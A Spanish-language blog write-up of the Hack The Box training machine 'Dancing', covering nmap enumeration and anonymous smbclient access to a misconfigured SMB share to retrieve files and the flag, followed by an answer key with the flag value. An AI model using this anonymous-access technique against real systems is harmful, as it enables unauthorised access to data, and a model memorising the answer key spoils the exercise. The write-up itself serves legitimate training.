---
layout: single
title: Dancing - Hack The Box
excerpt: "Dancing corresponde a la tercera caja de la serie Learn the Basics of Penetration Testing, Para este desafío evaluaremos el protocolo de comunicación SMB (Server Message Block), mismo que proporciona acceso compartido a archivos, impresoras y puertos seriales entre dispositivos finales de red, por lo general SMB se ejecuta en máquinas con sistemas operativos Windows."
date: 2022-09-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-dancing/dancing-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hack the box
  - starting point
  - tier 0
tags:
  - penetration tester level 1
  - smb
  - windows
  - enumeration
---

![](/assets/images/htb-writeup-dancing/dancing1.png)

Dancing corresponde a la tercera caja de la serie Learn the Basics of Penetration Testing, Para este desafío evaluaremos el protocolo de comunicación SMB (Server Message Block), el mismo que proporciona acceso compartido a archivos, impresoras y puertos seriales entre dispositivos finales de red, por lo general SMB se ejecuta en máquinas con sistemas operativos Windows.

SMB se ejecuta en las capas de Aplicación o Presentación del modelo OSI mediante el puerto 445 TCP, Debido a esto, SMB se basa en protocolos de nivel inferior para la capa de transporte. El protocolo SMB de Microsoft utiliza con frecuencia el protocolo NetBIOS sobre TCP/IP (NBT) para la capa de transporte. Por ende, durante los escaneos, lo más probable es que veamos ambos protocolos con puertos abiertos ejecutandose en el destino

Un cliente (usuario de una aplicación) que utilice el protocolo SMB puede acceder a archivos en un servidor remoto, junto con otros recursos como impresoras. Por lo tanto, el cliente puede leer, crear y actualizar archivos en el servidor remoto. Tambien puede comunicarse con cualquier programa de servidor que esté configurado para recibir una solicitud de cliente SMB.

Un almacenamiento habilitado de SMB en la red se denomina recurso compartido. Cualquier cliente que tenga la direccion IP del servidor y las credenciales adecuadas puede acceder a estos. SMB como muchos protocolos de acceso a archivos requiere capas de seguridad para funcionar adecuadamente dentro de una topología de red. A nivel de usuario, Los clientes SMB deben proporcionar una combinacion de usuario y contraseña para acceder y interactuar con el contenido del recurso compartido SMB.

SMB a pesar de tener la capacidad de asegurar el acceso al recurso compartido, un administrador de red puede cometer errores y accidentalmente permitir inicios de sesión sin ninguna credencial valida o inicios de sesión anónimos, Hoy explotaremos esta vulnerabilidad.

## Enumeración

![](/assets/images/htb-writeup-dancing/ip-dancing.png)

Como en tutoriales anteriores, empezamos escaneando el objetivo una vez que estemos conectados a la VPN. Ejecutamos el comando `sudo nmap -sV {target_IP}, esto hará que nmap escanee todos los puertos y muestre las versiones del servicio para cada uno de ellos

```
┌─[fabro@parrot]─[~]
└──╼ $sudo nmap -sV 10.129.129.8
[sudo] password for fabro: 
Nmap scan report for 10.129.129.8
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Se observa que el puerto 445 TCP para SMB se encuentra abierto, por ende tenemos un recurso compartido activo que podríamos explorar. Para enumerar el contenido compartido en el sistema remoto, podemos usar el script de `smbclient`, con el comando `sudo apt-get install smbclient`.

Al ejecutar el script, smbclient intentará conectarse al host remoto y verificará si se requiere de autenticación, si la hay, solicitará una contraseña para su nombre de usuario local. Si no especificamos un nombre de usuario específico para smbclient al intentar conectarnos al host remoto, el script tomará el nombre de la sesión de su máquina virtual. Esto se debe a que la autenticación SMB siempre requiere un nombre de usuario, por lo que al no darle uno explícitamente para intentar iniciar sesión, solo tendrá que pasar su nombre de usuario local actual para evitar generar un error con el protocolo.

![](/assets/images/htb-writeup-dancing/conexion.png) 

<p align="center">Procedimiento de conexión y transferencia de archivos SMB</p>
<p align="center">Fuente: Dancing Write-up - Hack The Box</p>

Si fueramos un usuario remoto legítimo que intenta iniciar sesión en su recurso, conoceríamos nuestro nombre de usuario y contraseña e iniciaríamos sesión normalmente para acceder a nuestro recurso compartido, en este caso, no tenemos tales credenciales, por lo que trataremos de iniciar sesión de la siguiente manera utilizando nuestro nombre de usuario local:

- Guest authentication
- Anonymous authentication

Cualquiera de estas combinaciones de usuario/contraseña nos permitira acceder y ver los archivos almacenados en el recurso compartido. Dejamos el campo de contraseña en blanco, simplemente presionando Enter para indicarle al script que continue.

El comando `smbclient -L {target_IP}` establecera conexión con el host destino, la opción `-L` obtiene una lista de recursos compartidos disponibles en un host. Para obtener mas información sobre las capacidades del script smbclient podemos ejecutar `smbclient --help o -h 

```
┌─[fabro@parrot]─[~]
└──╼ $smbclient -L 10.129.129.8
Enter WORKGROUP\fabro's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

Al ejecutar el comando anterior, observamos que existen cuatro recurso compartidos separados donde:
- ADMIN$: los recursos compartidos administrativos son recursos compartidos de red ocultos creados por la familia de sistemas operativos Windows NT que permiten a los administradores del sistema tener acceso remoto a cada volumen de disco en un
sistema conectado a la red. Es posible que estos recursos compartidos no se eliminen de forma permanente, pero se pueden deshabilitar.
- C$: recurso compartido administrativo para el volumen de disco C:\. Aquí es donde se aloja el sistema operativo.
- IPC$ - La cuota de comunicación entre procesos. Se utiliza para la comunicación entre procesos a través de canalizaciones con nombre y no forma parte del sistema de archivos.
- WorkShares: recurso compartido personalizado.

## Foothold

En este paso intentaremos conectarnos a cada uno de los recursos compartidos excepto al recurso IPC$, debido que no es un directorio navegable y no contiene ningun archivo que podamos usar en esta etapa de aprendizaje. Utilizaremos la misma técnica de conexión de antes, intentando iniciar sesión sin las credenciales adecuadas con le proposito de encontrar permisos configurados incorrectamente en cualquiera de los recurso compartidos. Únicamente proporcionaremos una contraseña en blanco para cada nombre, iniciando por el ADMIN$

```
┌─[fabro@parrot]─[~]
└──╼ $smbclient \\\\10.129.129.8\\ADMIN$
Enter WORKGROUP\fabro's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

Se emite NT_STATUS_ACCESS_DENIED, lo que nos permite saber que no tenemos las credenciales adecuadas para conectarnos a este recurso compartido. Haremos un seguimiento con el recurso compartido de C$.

```
┌─[fabro@parrot]─[~]
└──╼ $smbclient \\\\10.129.129.8\\C$
Enter WORKGROUP\fabro's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```
Continuamos con el intento de iniciar sesión en el recurso compartido SMB de WorkShares.

```
┌─[fabro@parrot]─[~]
└──╼ $smbclient \\\\10.129.129.8\\WorkShares
Enter WORKGROUP\fabro's password: 
Try "help" to get a list of possible commands.
smb: \> 
```

¡Éxito! El recurso compartido SMB de WorkShares estaba mal configurado, lo que nos permite iniciar sesión sin las credenciales adecuadas. Podemos ver que nuestro prompt de terminal cambió a `smb: \>`, lo que nos permite saber que nuestro shell ahora está
interactuando con el servicio. Podemos ejecutar el comando `help` para analizar qué podemos realizar dentro de este shell.

```
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!
```

Podemos notar que la mayoría de los comandos de Linux están presentes. Usaremos los siguientes comandos para navegar por el recurso compartido.

- ls : listing contents of the directories within the share
- cd : changing current directories within the share
- get : downloading the contents of the directories within the share
- exit : exiting the smb shell

Si escribimos el comando `ls` nos mostrará dos directorios, uno para Amy.J y otro para James.P. Ingresamos al primer directorio y encontramos el archivo `worknotes.txt`, que podemos descargar usando el comando `get`.

```
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1751781 blocks available
smb: \> cd Amy.J\
smb: \Amy.J\> LS
  .                                   D        0  Mon Mar 29 04:08:24 2021
  ..                                  D        0  Mon Mar 29 04:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 06:00:37 2021

		5114111 blocks of size 4096. 1751781 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
```

Este archivo ahora se guarda dentro de la ubicación desde donde ejecutamos nuestro comando smbclient. Sigamos buscando otros archivos en el directorio de James.P. Cambiando de directorio, Podemos encontrar el archivo flag.txt que nos interesa. Después de descargar este archivo, podemos usar el comando `exit` para salir del shell y verificar los archivos que acabamos de recuperar.

```
smb: \Amy.J\> cd ..
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 04:26:57 2021

		5114111 blocks of size 4096. 1751781 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0,0 KiloBytes/sec) (average 0,1 KiloBytes/sec)
smb: \James.P\> exit
┌─[fabro@parrot]─[~]
└──╼ $ls
flag.txt worknotes.txt
┌─[fabro@parrot]─[~]
└──╼ $cat flag.txt 
5f61c10dffbc77a704d76016a22f1664
```

## Respuestas

Task 1

What does the 3-letter acronym SMB stand for? 
- Server Message Block

Task 2

What port does SMB use to operate at? 
- 445

![](/assets/images/htb-writeup-dancing/task1-2.png)

Task 3

What is the service name for port 445 that came up in our Nmap scan? 
- microsoft-ds

Task 4

What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?
- -L

![](/assets/images/htb-writeup-dancing/task3-4.png)

Task 5

How many shares are there on Dancing? 
- 4

Task 6

What is the name of the share we are able to access in the end with a blank password?
- WorkShares

![](/assets/images/htb-writeup-dancing/task5-6.png)

Task 7

What is the command we can use within the SMB shell to download the files we find?
- get

Task 8

Submit root flag
- 5f61c10dffbc77a704d76016a22f1664

![](/assets/images/htb-writeup-dancing/task7-8.png)

## Certificado

<p> Al envíar la bandera a Hack The Box, recibímos un mensaje de "Dancing has been Pwned", el desafío se resolvió con éxito. Mi certificado de la máquina Dancing se encuentra disponible <a href="https://www.hackthebox.com/achievement/machine/914953/395" target="_blank">aquí</a>.</p>
![](/assets/images/htb-writeup-dancing/certificado.png)
